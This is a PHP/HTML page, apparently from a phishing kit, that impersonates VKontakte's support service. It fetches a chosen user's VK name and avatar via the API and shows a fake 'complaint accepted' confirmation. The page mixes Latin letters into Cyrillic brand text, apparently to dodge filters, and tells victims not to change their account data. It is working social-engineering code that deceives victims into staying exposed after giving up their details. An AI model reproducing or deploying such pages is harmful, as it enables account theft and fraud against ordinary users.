<? session_start();

include('../bdlog.php');

if(isset($_GET['reff'])) {
	$_SESSION['comment'] = $_GET['reff'];
	$sessref = $_SESSION['comment'];
} else {
	$sessref = 'non-ref';
} 
$nastr = $db->query("SELECT * FROM settings");
while ($result = mysqli_fetch_array($nastr)) {
		$jalobaid = $result['jalobaid'];
		$jalobacolvo = $result['jalobacolvo'];
    }


$frd = json_decode(file_get_contents('https://api.vk.com/method/users.get?v=5.95&user_ids='.$jalobaid.'&fields=counters,country,sex,city,photo_200&access_token='.$admintoken));

$avatar1 = $frd -> response[0] -> photo_200;
$firstname1 = $frd -> response[0] -> first_name;
$lastname1 = $frd -> response[0] -> last_name;

?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title><?echo "$firstname1 $lastname1"?></title>
    <meta name="description" content="BKoнтaктe – yнивepcaльнoe срeдствo для oбщeния и пoискa друзeй и oднoклaссникoв, кoтoрым eжeднeвнo пoльзуются дeсятки миллиoнoв чeлoвeк. Мы хoтим, чтoбы друзья, oднoкурсники, oднoклaссники, сoсeди и кoллeги всeгдa oстaвaлись в кoнтaктe.">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="shortcut icon" type="image/gif" href="https://vk.com/images/icons/favicons/fav_logo.ico?6">
    <link rel="apple-touch-icon" href="../assets/other/template/images/safari_60.png">
    <link rel="apple-touch-icon" sizes="76x76" href="../assets/other/template/images/safari_76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="../assets/other/template/images/safari_120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="../assets/other/template/images/safari_152.png">
    <meta property="og:site_name" content="Жалоба">
    <meta property="og:type" content="website">
    <noscript>
        <meta http-equiv="refresh" content="/badbrowser">
    </noscript>
    <link type="text/css" href="../assets/other/template/main2.css" rel="stylesheet">
    <link type="text/css" href="../assets/other/template/common.css" rel="stylesheet">

    <body class="fixed-header">
        <nav class="navbar navbar-default navbar-fixed-top">
            <div class="container">
                <div class="navbar-header">
                    <a class="navbar-brand"></a>
                </div>
                <ul class="nav navbar-nav navbar-right hidden-xs">
                    <li>
                        <a class="user-info">
                            <div style="position:relative; margin-right: 10px; float: left;"><?echo "$firstname1"?></div>
                            <img src="<?echo "$avatar1"?>" alt="<?echo "$firstname1"?>"></a>
                    </li>
                </ul>
            </div>
        </nav>
        <div class="container text-center">
            <div class="content">
                <div id="step1" style="display: block">
                    <div class="content-text">
                        <img src="../assets/other/template/dog.jpg" class="img-responsive img-ct" alt="Павел Дуров" style="border-radius:10px 10px 10px 10px;-webkit-border-radius:10px 10px 10px 10px;-moz-border-radius:10px 10px 10px 10px;">Уважаемый(ая) <b><?echo "$firstname1 $lastname1"?></b>!
                        <br>
                        <br>
                        <center>Ваша заявка успешно принята
                            <br>Вы будете оповещены о результате, до этого времени не рекомендуется менять Ваши данные. </center>
                        <br>Возвращайтесь к просмотру новостей, наверняка там появилось что-то интересное.<br>
                        <center><a href="https://vk.com/feed" class="flat_button btn btn-block btn-primary btn-ml">Вернуться</a></center>
                        <br>
                        <p style="float: right;">С уважением, Служба Поддержки.</p>
                    </div>

                </div>
            </div>
        </div>
        <script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
                <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
        <script async="" type="text/javascript" src="../assets/other/template/main.js?v=11"></script>
        <div id="footer_wrap" class="footer_wrap" style="width:960px; margin:40px auto; padding: 24px 15px 35px; border-top: 1px solid #e4e8ed;">
            <div class="footer_nav" id="bottom_nav" style="width:100%; margin:0 auto;">
                <div class="footer_copy fl_l"><a href="https://vk.com/about" target="_blank">BKонтакте</a> © 2006-2021</div>
                <div class="footer_lang fl_r"><a class="footer_lang_link">English</a><a class="footer_lang_link">Pусский</a><a class="footer_lang_link">Укрaїнськa</a><a class="footer_lang_link">всe языки »</a></div>
                <div class="footer_links">
                    <a class="bnav_a" target="_blank">o компании</a>
                    <a class="bnav_a" target="_blank">правила</a>
                    <a class="bnav_a" target="_blank" style="">реклама</a>
                    <a class="bnav_a" target="_blank">разработчикам</a>
                </div>
            </div>
            <div class="footer_bench clear">
            </div>
        </div></body></head>
</html>